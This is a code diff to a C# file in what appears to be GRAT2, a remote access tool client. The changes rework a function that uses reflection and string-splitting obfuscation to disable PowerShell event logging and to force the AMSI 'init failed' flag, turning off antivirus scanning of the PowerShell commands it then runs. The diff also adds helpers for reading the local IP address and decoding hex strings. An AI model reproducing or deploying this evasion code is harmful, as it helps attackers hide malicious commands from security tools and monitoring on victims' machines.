@@ -15,6 +15,12 @@ using System.Drawing;
 using System.Net.Sockets;
 using System.Threading;
 using GRAT2_Client.Injectious;
+using System.Diagnostics.Eventing;
+using System.Collections;
+using System.Net.Configuration;
+using System.Security.Authentication;
+using System.Security.Cryptography.X509Certificates;
+using System.Net.Security;
 
 namespace GRAT2_Client.PInvoke
 {
@@ -47,20 +53,23 @@ namespace GRAT2_Client.PInvoke
             p.WaitForExit();
             return output;
         }
-        
+
+        //Bypass AV (PS Logging)
+        public static Guid guidId = Guid.NewGuid();
+
         public static string UnPosh(string[] command)
         {
             //https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
             //https://twitter.com/mattifestation/status/735261176745988096?lang=en
 
-            PowerShell pInst = PowerShell.Create();
+             PowerShell pInst = PowerShell.Create();
             
             
             var pELP = pInst.GetType().Assembly.GetType("Sys" + "tem." + "Mana" + "geme" + "nt.Aut" + "oma" + "tio"+ "n.Tr" + "aci" + "ng.P" + "SE" + "twL" + "og" + "Pr" + "ovi" + "d" + "er");
             if (pELP != null)
             {
                 var eP = pELP.GetField("e"+"tw"+"Pr"+"ov"+"id"+"er", BindingFlags.NonPublic | BindingFlags.Static);
-                var eTP = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                var eTP = new EventProvider(guidId);
                 eP.SetValue(null, eTP);
             }
             
@@ -69,10 +78,10 @@ namespace GRAT2_Client.PInvoke
             var aU = pInst.GetType().Assembly.GetType("S"+"ys"+"te"+"m.M"+"an"+"ag"+"em"+"ent"+".A"+"ut"+"om"+"at"+"i"+"o"+"n.A"+"ms"+"i"+"U"+"ti"+"l"+"s");
             if (aU != null && bA == true)
             {
-                aU.GetField("a"+"m"+"s"+"iI"+"n"+"i"+"tF"+"ai"+"l"+"ed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
+                var aP = aU.GetField("a" + "m" + "s" + "iI" + "n" + "i" + "tF" + "ai" + "l" + "ed", BindingFlags.NonPublic | BindingFlags.Static);
+                aP.SetValue(null, true);
             }
             
-
             string readCommand = "";
             for (int i = 1; i < command.Length; i++)
             {
@@ -90,9 +99,9 @@ namespace GRAT2_Client.PInvoke
                     stringBuilder.Append(obj);
                 }
             }
-            catch
+            catch (Exception e)
             {
-                stringBuilder.Append(string.Format("Error {0}", pInst.InvocationStateInfo.Reason));
+                return stringBuilder.Append(string.Format("Error {0}", e.Message)).ToString();
             }
             return stringBuilder.ToString().Trim();
                         
@@ -596,6 +605,20 @@ namespace GRAT2_Client.PInvoke
             }
         }
 
-    }
+        public static string getLocalIP()
+        {
+            return Dns.GetHostEntry(Dns.GetHostName()).AddressList[1].ToString();
+        }
+
+        public static byte[] StringToByteArray(string hex)
+        {
+            return Enumerable.Range(0, hex.Length)
+                             .Where(x => x % 2 == 0)
+                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
+                             .ToArray();
+        }
+
+   
+     }
 
 }
